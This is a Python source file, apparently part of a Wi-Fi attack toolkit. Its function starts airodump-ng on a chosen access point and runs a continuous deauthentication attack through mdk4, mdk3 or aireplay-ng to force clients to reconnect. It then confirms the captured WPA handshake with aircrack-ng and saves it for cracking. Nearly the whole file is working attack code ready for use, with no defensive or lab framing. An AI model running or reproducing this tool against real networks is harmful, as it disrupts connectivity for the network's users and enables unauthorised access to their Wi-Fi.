import os
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from logger import logger
from config import HANDSHAKES_DIR, C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET


def _find_deauth_tool():
    for tool in ("mdk4", "mdk3", "aireplay-ng"):
        if shutil.which(tool):
            return tool
    return None


def _verify_handshake(cap_file, bssid):
    try:
        proc = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=10,
            stdin=subprocess.DEVNULL
        )
        for line in proc.stdout.splitlines():
            if bssid.lower() in line.lower() and "handshake" in line.lower():
                return True
    except Exception as e:
        logger.debug(f"aircrack verify failed: {e}")
    return False


def _kill_proc(proc):
    if proc is None or proc.poll() is not None:
        return
    try:
        if os.name != "nt":
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        else:
            proc.terminate()
        proc.wait(timeout=3)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown"):
    if not shutil.which("airodump-ng"):
        logger.error("airodump-ng not found")
        print(f"{C_RED}[!] airodump-ng not found. Install: sudo apt install aircrack-ng{C_RESET}")
        return None

    deauth_tool = _find_deauth_tool()
    if not deauth_tool:
        logger.error("No deauth tool found (mdk4/mdk3/aireplay-ng)")
        print(f"{C_RED}[!] No deauth tool found. Install mdk4: sudo apt install mdk4{C_RESET}")
        return None

    tmpdir = tempfile.mkdtemp(prefix="wfn_")
    cap_prefix = os.path.join(tmpdir, "cap")
    bl_file = os.path.join(tmpdir, "bl.txt")

    print(f"{C_YELLOW}[*] Using: airodump-ng + {deauth_tool}{C_RESET}")
    print(f"{C_YELLOW}[*] Capturing handshake for {bssid} on ch{channel} (timeout: {timeout}s){C_RESET}")

    airodump_proc = None
    deauth_proc = None

    try:
        airodump_cmd = [
            "airodump-ng",
            "--write", cap_prefix,
            "--output-format", "pcap",
            "--bssid", bssid,
            "--channel", str(channel),
            interface
        ]
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid if os.name != "nt" else None
        )
        logger.info(f"airodump-ng started (PID {airodump_proc.pid})")
        time.sleep(2)

        with open(bl_file, "w") as f:
            f.write(bssid + "\n")

        if deauth_tool in ("mdk4", "mdk3"):
            deauth_cmd = [deauth_tool, interface, "d", "-b", bl_file, "-c", str(channel)]
        else:
            deauth_cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid,
                          "--ignore-negative-one", interface]

        deauth_proc = subprocess.Popen(
            deauth_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid if os.name != "nt" else None
        )
        logger.info(f"{deauth_tool} started (PID {deauth_proc.pid})")
        print(f"{C_GREEN}[+] Deauth active ({deauth_tool}), monitoring...{C_RESET}")

        start = time.time()
        while time.time() - start < timeout:
            elapsed = int(time.time() - start)

            cap_file = f"{cap_prefix}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
                if _verify_handshake(cap_file, bssid):
                    print(f"\n{C_GREEN}[+] HANDSHAKE CAPTURED! ({elapsed}s){C_RESET}")

                    safe_ssid = "".join(c for c in ssid if c.isalpha() or c.isdigit() or c == ' ').strip()
                    if not safe_ssid or safe_ssid in ("Unknown", "<HIDDEN>"):
                        safe_ssid = "Unknown_SSID"
                    final_name = f"{bssid.replace(':', '-')}_{safe_ssid}.pcap"
                    final_path = os.path.join(HANDSHAKES_DIR, final_name)
                    shutil.copy2(cap_file, final_path)
                    print(f"{C_GREEN}    Saved: {final_path}{C_RESET}")
                    logger.info(f"Handshake captured: {final_path}")
                    return final_path

            sys.stdout.write(f"\r\033[K{C_CYAN}    [{elapsed}s/{timeout}s] Waiting for handshake...{C_RESET}")
            sys.stdout.flush()
            time.sleep(3)

        print(f"\n{C_RED}[-] Handshake not captured within {timeout}s{C_RESET}")
        return None

    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[*] Capture interrupted{C_RESET}")
        return None
    except Exception as e:
        logger.error(f"Native capture error: {e}")
        print(f"{C_RED}[!] Capture error: {e}{C_RESET}")
        return None
    finally:
        _kill_proc(deauth_proc)
        _kill_proc(airodump_proc)
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass
